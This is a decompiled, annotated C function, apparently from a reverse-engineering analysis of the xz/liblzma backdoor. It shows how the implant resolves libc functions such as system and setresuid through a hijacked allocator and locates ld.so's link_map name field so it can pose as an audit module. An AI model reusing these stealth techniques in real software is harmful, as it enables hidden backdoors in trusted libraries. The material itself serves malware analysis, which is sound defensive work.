// /home/kali/xzre-ghidra/xzregh/104080_find_link_map_l_name.c
// Function: find_link_map_l_name @ 0x104080
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_link_map_l_name(backdoor_data_handle_t * data_handle, ptrdiff_t * libname_offset, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Locates the live `link_map::l_name` byte inside ld.so and gathers the libc/libcrypto imports needed later in the run. It
 * piggybacks on the fake `lzma_alloc` resolver to look up `exit`, `setlogmask`, `setresgid`, `setresuid`, `system`, `shutdown`,
 * and `BN_num_bits`, then walks the cached liblzma link_map snapshot inside the binary until it finds the entry whose RELRO tuple
 * matches the running liblzma image. The resulting displacement becomes both `*libname_offset` and the pointer used to index
 * `hooks->ldso_ctx.libcrypto_l_name`, and the helper double-checks that `_dl_audit_symbind_alt` references the same offset so
 * later code can safely rewrite the `l_name` field when posing as an audit module.
 */

#include "xzre_types.h"

BOOL find_link_map_l_name
               (backdoor_data_handle_t *data_handle,ptrdiff_t *libname_offset,
               backdoor_hooks_data_t *hooks,imported_funcs_t *imported_funcs)

{
  libc_imports_t *libc_imports;
  elf_info_t *ldso_elf;
  link_map *candidate_map;
  dl_audit_symbind_alt_fn code_start;
  BOOL success;
  ptrdiff_t snapshot_offset;
  lzma_allocator *allocator;
  pfn_exit_t exit_fn;
  pfn_setlogmask_t setlogmask_fn;
  pfn_setresgid_t setresgid_fn;
  lzma_allocator *libcrypto_allocator;
  Elf64_Sym *audit_preinit_symbol;
  pfn_BN_num_bits_t bn_num_bits_fn;
  uchar *audit_sym_start;
  pfn_setresuid_t setresuid_fn;
  pfn_system_t system_fn;
  pfn_shutdown_t shutdown_fn;
  link_map *snapshot_entry;
  link_map *runtime_entry;
  u64 displacement;
  link_map *snapshot_iter;
  link_map *relro_limit;
  link_map *liblzma_snapshot;
  
  success = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x6c,0x10,5);
  if (success != FALSE) {
    libc_imports = imported_funcs->libc;
    liblzma_snapshot = data_handle->runtime_data->liblzma_link_map;
    allocator = get_lzma_allocator();
    allocator->opaque = data_handle->cached_elf_handles->libc;
    exit_fn = (pfn_exit_t)lzma_alloc(0x8a8,allocator);
    libc_imports->exit = exit_fn;
    if (exit_fn != (pfn_exit_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    setlogmask_fn = (pfn_setlogmask_t)lzma_alloc(0x428,allocator);
    libc_imports->setlogmask = setlogmask_fn;
    if (setlogmask_fn != (pfn_setlogmask_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    setresgid_fn = (pfn_setresgid_t)lzma_alloc(0x5f0,allocator);
    libc_imports->setresgid = setresgid_fn;
    if (setresgid_fn != (pfn_setresgid_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    libcrypto_allocator = get_lzma_allocator();
    ldso_elf = data_handle->cached_elf_handles->dynamic_linker;
    libcrypto_allocator->opaque = data_handle->cached_elf_handles->libcrypto;
    audit_preinit_symbol = elf_symbol_get(ldso_elf,STR_dl_audit_preinit,0);
    if (audit_preinit_symbol != (Elf64_Sym *)0x0) {
      bn_num_bits_fn = (pfn_BN_num_bits_t)lzma_alloc(0x4e0,libcrypto_allocator);
      imported_funcs->BN_num_bits = bn_num_bits_fn;
      if (bn_num_bits_fn != (pfn_BN_num_bits_t)0x0) {
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
      }
      ldso_elf = data_handle->cached_elf_handles->dynamic_linker;
      audit_sym_start = ldso_elf->elfbase->e_ident + audit_preinit_symbol->st_value;
      success = elf_contains_vaddr(ldso_elf,audit_sym_start,audit_preinit_symbol->st_size,4);
      snapshot_iter = liblzma_snapshot + 0x960;
      if (success != FALSE) {
LAB_001041f0:
        if (liblzma_snapshot != snapshot_iter) {
          ldso_elf = data_handle->cached_elf_handles->liblzma;
          if ((*(u64 *)liblzma_snapshot != ldso_elf->gnurelro_vaddr) ||
             (*(u64 *)(liblzma_snapshot + 8) != ldso_elf->gnurelro_memsize)) goto LAB_001041ec;
          snapshot_entry = (link_map *)0x0;
          runtime_entry = (link_map *)0xffffffffffffffff;
          for (snapshot_iter = data_handle->runtime_data->liblzma_link_map; snapshot_iter < liblzma_snapshot + 0x18;
              snapshot_iter = snapshot_iter + 8) {
            candidate_map = *(link_map **)snapshot_iter;
            if (liblzma_snapshot + 0x18 <= candidate_map) {
              relro_limit = runtime_entry;
              if (liblzma_snapshot + 0x68 <= runtime_entry) {
                relro_limit = liblzma_snapshot + 0x68;
              }
              if (candidate_map < relro_limit) {
                snapshot_entry = snapshot_iter;
                runtime_entry = candidate_map;
              }
            }
          }
          if (runtime_entry != (link_map *)0xffffffffffffffff) {
            allocator->opaque = data_handle->cached_elf_handles->libc;
            setresuid_fn = (pfn_setresuid_t)lzma_alloc(0xab8,allocator);
            libc_imports->setresuid = setresuid_fn;
            if (setresuid_fn != (pfn_setresuid_t)0x0) {
              libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
            }
            liblzma_snapshot = data_handle->runtime_data->liblzma_link_map;
            displacement = (long)runtime_entry - (long)liblzma_snapshot;
            snapshot_offset = (int)liblzma_snapshot - (int)snapshot_entry;
            if (liblzma_snapshot <= snapshot_entry) {
              snapshot_offset = (int)snapshot_entry - (int)liblzma_snapshot;
            }
            (hooks->ldso_ctx).libcrypto_l_name =
                 (char **)(data_handle->runtime_data->libcrypto_link_map + snapshot_offset);
            success = find_lea_instruction(audit_sym_start,audit_sym_start + audit_preinit_symbol->st_size,displacement)
            ;
            if (success == FALSE) {
              return FALSE;
            }
            code_start = (hooks->ldso_ctx)._dl_audit_symbind_alt;
            success = find_lea_instruction
                              ((u8 *)code_start,
                               (u8 *)(code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
                               displacement);
            if (success == FALSE) {
              return FALSE;
            }
            allocator->opaque = data_handle->cached_elf_handles->libc;
            system_fn = (pfn_system_t)lzma_alloc(0x9f8,allocator);
            libc_imports->system = system_fn;
            if (system_fn != (pfn_system_t)0x0) {
              libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
            }
            shutdown_fn = (pfn_shutdown_t)lzma_alloc(0x760,allocator);
            libc_imports->shutdown = shutdown_fn;
            if (shutdown_fn != (pfn_shutdown_t)0x0) {
              libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
            }
            libcrypto_allocator->opaque = data_handle->cached_elf_handles->libcrypto;
            *libname_offset = displacement;
            return TRUE;
          }
        }
      }
      lzma_free(imported_funcs->BN_num_bits,libcrypto_allocator);
    }
  }
  return FALSE;
LAB_001041ec:
  liblzma_snapshot = liblzma_snapshot + 8;
  goto LAB_001041f0;
}

